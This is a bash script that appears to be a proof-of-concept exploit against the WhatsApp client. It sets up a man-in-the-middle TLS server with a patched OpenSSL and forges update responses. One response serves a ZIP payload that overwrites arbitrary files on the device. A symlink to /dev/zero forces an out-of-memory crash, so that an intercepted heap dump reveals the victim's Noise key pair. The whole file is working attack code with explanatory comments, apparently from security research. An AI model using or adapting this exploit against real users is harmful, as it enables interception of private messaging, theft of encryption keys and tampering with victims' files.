#!/bin/bash

create_files()
{
    #
    # Depending on the last time the manifest was fetched, the WhatsApp client
    # might also request this one. The "existing_id" parameter might differ on
    # your system, so, beware.
    #
    cat > "downloadable?category=manifest&locale=en&existing_id=RhjSkX-yoTP-Q0I6tS2_3Qo6GIxWv1p0Oq0UA9bTCwA" << EOF
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.9.1
Date: $(date +"%a, %d %b %Y %H:%M:%S %z")
Connection: keep-alive
content-disposition: attachment;filename=manifest.json
content-type: application/json
content-length: 4406
idhash: RhjSkX-yoTP-Q0I6tS2_3Qo6GIxWv1p0Oq0UA9bTCwA

{
    "categories": {
        "doodle_emoji": {
            "bundle_size": 100,
            "bundles": [
                "D2I_we9UlMYVytDHDlwD--QwwC_oC-z_UZeQYekBsUU",
                "VnDgkeVxsn3YY_A5TJDjL9lRZ2hcLoLQMRidgXBMg7w",
                "SOMOi-BmHQx5kDRMatpA9rzb7viQ6GEWkvHhxcQu1Go",
                "IsyM5AG0Yd4pm1SUQktiKPO8rhgjo23jC9DaYx17I2s",
                "fP6dh_qSsTwrlVt9B51WP-Me-y1idQjarugjVPElX0w",
                "bTCuCy6YGBhd8G4WLjfUSszYtJd_Fa8fnrZdB-dHdrU",
                "TYRmuEjRDWmDyQJYhX3Cjy2Hzvl5wMiXUZ71na4Akk0",
                "nMirJ30Z4r-vPCuh-obRlZwhsCe-CXkMcwx1_RVfs-c",
                "DpM42jTPp0vzeVMpSmlX82j2TwEUq6V6lf5ejqpT8bU",
                "heE0J2xa7e9PFdIwwk-N5lJv6YeZtip4GBe4hZooS3o",
                "lYm9Jn5-wAQvbvkS7aU-8v5SBpSl8WRmS1VCbK_2Xxc",
                "cMIzHAa4xhfvPzDfhwCAyfRghQtutd10M6jznTNAFXw",
                "nwml0G1fAI_VABGRXiVhZt3aT0Tf1_Rqm-CyvAoqL3o",
                "-SqkgVjT7P10Abx0caa0VpQaMnWYmQx5Q8knPQJ9Tv4",
                "-ARHwJX8TFSnSA6PXGZKythY8WafmH04OTLNxCcj3G0",
                "IPSQXBRR6zJMpg-Zcu0oiWsBaUVZxjTzsfkUpTHzt70",
                "Hncx-RHSSwccu6zEsub7foOyQhwh_-WePWJ_7LaeUiU",
                "LmUJGVZ74W9d-jYeQhVYx0aUXsEzE-zBQ7mwYXxrG2k",
                "zTQKmZpaSQ7T67bgIp7TG4YQyTtOVoTOr92HwX5iAqY",
                "QNqTUTmDnj9-KMxL6-Pi-Q9VELYodD4DXDBwJvZeqHg",
                "asCJFUy3n2u8vrwpkRv7bKgbWI4YPGlXU_0glESn2RA",
                "a2UsfVa2l5_tYNAPPrDbMXOdR-SzT9kt6ZafmyM07YE",
                "S3I2PD7Hg6RfbzL8Qi0MUXNOwsTscBJOekPgYVJd-PM",
                "MuzMsBnEDnFHC1I-HxN06AYzm4acv-_vukRS2KAnDmI",
                "2Lnf9noiIdi9k5jGzMGDCtAxdndWgfqPT7ekNlO70S4",
                "8bCSWkV0UwQfMMrFCaaSwZ_Ui0BHj8w8RnHPj0C3xdg"
            ],
            "id_hash": "wO21-RDTgFWiIgxqq73Hn4ouqz5_X0VfWVESeR5rMzA"
        },
        "emoji": {
            "id_hash": "4b-X0qEXeXvZn4zfVgMZNO_-_eOW_W7MmwHUkyT08Cs"
        },
        "filter": {
            "id_hash": "YHbwxhPS2U4WtSgbh9e47EKR_cmhYwWErgJoiPpIzuQ"
        },
        "sticker_all": {
            "id_hash": "7TaF4gnsqf2ntx1QL6vk7RXkKxr2qngekDw2zAz3Bl0"
        },
        "sticker_pack_1554174724811575": {
            "id_hash": "CPD97qgsKKJnXn8JxuXouJk6rtY9zwp1utzQyCh-J5c"
        },
        "sticker_pack_156862148154586": {
            "id_hash": "8UW794rvsNItjntoWnVluEoysxBbpW4-313U9fhq1GI"
        },
        "sticker_pack_464740130392200": {
            "id_hash": "3M92SeiU3iaI_WN7WUmKsp4uXDmkypaEDHRddTmm3_U"
        },
        "sticker_pack_497837993632037": {
            "id_hash": "K5nCTSNQoosLVvlzl3ioH0SagTALliSXIG88Hc3VlHU"
        },
        "sticker_pack_523658474454511": {
            "id_hash": "v7fbqsZ5wsxkx653LysmFcw3_N1Cjqm_PnM-W2yo7Zc"
        },
        "sticker_pack_641022829246662": {
            "id_hash": "eP6GanH6EwHIVxma8B-_BlA_sctIsPWwQyum_Xhc5NE"
        },
        "sticker_pack_654439774571103": {
            "id_hash": "Ca_xVr280Bw9kUEBsfknVwcnIrTviJrdvyAtGpgLMfw"
        },
        "sticker_pack_Biscuit": {
            "id_hash": "N9t7N3rtpb6R9GJghcL35TNDFyxNsyy6SA0qNRm8keM"
        },
        "sticker_pack_CricketMatchup": {
            "id_hash": "3-YhVX3NIxUFjM9civOAaRUrnztpZl507yyvmyRkHHA"
        },
        "sticker_pack_DeBoa": {
            "id_hash": "DS-cZee_EW1gWHiQ0WIcE4-bcqF3fVKZypMeDqVoXQk"
        },
        "sticker_pack_FierceOutLoud": {
            "id_hash": "Rl9XmEZ0q8vtF8U_99eDaNBybeu0GhQmU2lmP2zNN7k"
        },
        "sticker_pack_Freej": {
            "id_hash": "_OGTK2Ep4NOHA-e1fh4-_0k192hXxsKrApwjOpmnFnQ"
        },
        "sticker_pack_LoveOfSoccer": {
            "id_hash": "KOGrsM3_vvnPgXHrHYKfP9fHr52D0tXICSyN9aoWyRg"
        },
        "sticker_pack_MerryAndBright": {
            "id_hash": "UumQu0PLMrrnbBMFVvlFLlgk0nyG71edyS0bOS0FuVE"
        },
        "sticker_pack_Opi": {
            "id_hash": "VyEABLw31RC7gxRq9c0uLDG8kX8J7SexxqPjx1V-7EI"
        },
        "sticker_pack_PlayfulPiyomaru": {
            "id_hash": "PdkXQEaAqdLbpQIN1kH3_NR9V4lWgSjm1_RxMkMzu50"
        },
        "sticker_pack_Salty": {
            "id_hash": "70Ut_RFUrypA3d6fBOGGTm4cNBuaftBBsRtpye-VtiI"
        },
        "sticker_pack_whatsapp-komo": {
            "id_hash": "-_I4D0fZabdhHfadWvkX_7JybiRW7of1nqaK_J52-Xs"
        },
        "sticker_pack_whatsappcuppy": {
            "id_hash": "l3j555JhaY_PY0uB2AJGer4FN1RqGUBYFd2bcYRKP1c"
        }
    }
}
EOF

    #
    # This file will serve our ZIP payload, which will be extracted by WhatsApp,
    # resulting in arbitrary files being overwritten with attacker controlled
    # content.
    #
    cat > "downloadable?category=filter" << EOF
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.9.1
Date: $(date +"%a, %d %b %Y %H:%M:%S %z")
Connection: keep-alive
content-disposition: attachment;filename=filter_en_YHbwxhPS2U4WtSgbh9e47EKR_cmhYwWErgJoiPpIzuQ.zip
content-type: application/zip
content-length: $(wc -c < payload.zip | sed s/[[:space:]]*//g)
idhash: YHbwxhPS2U4WtSgbh9e47EKR_cmhYwWErgJoiPpIzuQ

EOF
    cat payload.zip >> "downloadable?category=filter"

    #
    # The following symlink handles the sticker downloader:
    #
    # https://static.whatsapp.net/sticker?cat=all&lg=en-US&country=GR&ver=2
    #
    # We set the symlink to point to "/dev/zero" in order to trigger an OOM in
    # the WhatsApp process, which, in turn, will trigger WhatsApp's custom OOM
    # handler. The OOM handler will dump the heap data and will upload it to
    # crashlogs.whatsapp.net, which we can also MitM. The victim's Noise key
    # pair can then be recovered by examining the heap data.
    #
    ln -sf /dev/zero "sticker?cat=all&lg=en-US&country=GR&ver=2"
}


start_server()
{
    #
    # In the following, we use OpenSSL's -HTTP option to serve files containing
    # custom HTTP headers. You can replace it with either -WWW or -www to
    # implement your own hacks, however, if you need normal s_server I/O you
    # must use -ign_eof and -early_data.
    #
    # Set the USE_SYSTEM environment variable to use system's OpenSSL instead of
    # the modified one. This is more or less meaningless, unless you want to
    # debug OpenSSL internals.
    #
    if [ -z "$USE_SYSTEM" ]; then
        echo "Running TLS v1.2 version"

        #
        # In order to execute our modified OpenSSL in-place, we need to preserve
        # LD_LIBRARY_PATH in the new sudo environment. This is generally not
        # allowed, unless sudo has been explicitly configured to allow so. To
        # avoid spending time debugging environment issues (like I did),
        # configure and compile OpenSSL as shown below:
        #
        # ./config -d no-shared && make -j8
        #
        # In any case, we also set LD_LIBRARY_PATH and hope for the best.
        #
        if [ "$(uname)" = "Darwin" ]; then
            export DYLD_LIBRARY_PATH="$OPENSSL_SRC"
        else
            export LD_LIBRARY_PATH="$OPENSSL_SRC"
        fi
        sudo -sE "$OPENSSL_SRC/apps/openssl" s_server \
            -tls1_2 \
            -port 443 \
            -cert "$SECRETS/cert.pem" \
            -key "$SECRETS/key.pem" \
            -stateless \
            -no_ticket \
            -HTTP
    else
        echo "Running system version"

        sudo openssl s_server \
            -tls1_2 \
            -port 443 \
            -cert "$SECRETS/cert.pem" \
            -key "$SECRETS/key.pem" \
            -stateless \
            -no_ticket \
            -HTTP
    fi
}


main()
{
    #
    # Path to the OpenSSL source code patched with our TLS 1.2 MitM patch.
    #
    if [ -z "$OPENSSL_SRC" ]; then
        echo "OPENSSL_SRC not set!"
        return
    fi

    #
    # Path to the directory containing "cert.pem" and "key.pem".
    #
    if [ -z "$SECRETS" ]; then
        echo "SECRETS not set!"
        return
    fi

    #
    # For testing purposes, one might want to run the server without providing
    # a "payload.zip". It's ok, just use "/dev/null" instead.
    #
    if [ ! -f payload.zip ]; then
        ln -sf /dev/null payload.zip
    fi

    #
    # Create files in the format expected by OpenSSL's -HTTP option.
    #
    create_files

    #
    # Start the MitM OpenSSL server.
    #
    start_server
}


main "$@"

# EOF
